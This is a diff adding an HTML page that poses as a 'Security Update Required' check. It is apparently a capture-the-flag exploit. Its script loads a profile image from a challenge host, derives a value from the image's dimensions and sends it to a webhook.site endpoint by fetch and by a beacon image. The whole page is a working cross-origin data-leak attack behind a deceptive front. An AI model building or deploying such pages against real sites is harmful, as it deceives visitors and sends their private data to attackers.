@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Security Update Required</title>
+</head>
+<body>
+    <h1>Checking your security settings...</h1>
+    <script>
+        // Cargar la imagen de Pepe
+        const img = new Image();
+        
+        img.onload = function() {
+            const width = this.naturalWidth;
+            const height = this.naturalHeight;
+            const nivel = width * height;
+            
+            console.log('Dimensiones encontradas:', width, '×', height, 'Nivel:', nivel);
+            
+            // Enviar a webhook
+            fetch('https://webhook.site/81cad3b7-b64b-4b32-a4de-1f9d4fd8768c', {
+                method: 'POST',
+                body: JSON.stringify({
+                    nivel: nivel,
+                    width: width,
+                    height: height,
+                    calculado: width * height
+                }),
+                headers: {'Content-Type': 'application/json'}
+            });
+            
+            // También como fallback en URL
+            const beacon = new Image();
+            beacon.src = 'https://webhook.site/81cad3b7-b64b-4b32-a4de-1f9d4fd8768c?nivel=' + nivel + '&w=' + width + '&h=' + height;
+        };
+        
+        img.onerror = function(e) {
+            console.error('Error loading image:', e);
+            fetch('https://webhook.site/81cad3b7-b64b-4b32-a4de-1f9d4fd8768c?error=1');
+        };
+        
+        // Forzar fresh request
+        img.src = 'https://chl-7a4773d0-583b-48c9-a6d8-e797a0145e8e-imagen-importante.softwareseguro.com.ar/profile-pic' + Date.now();
+    </script>
+</body>
+</html>
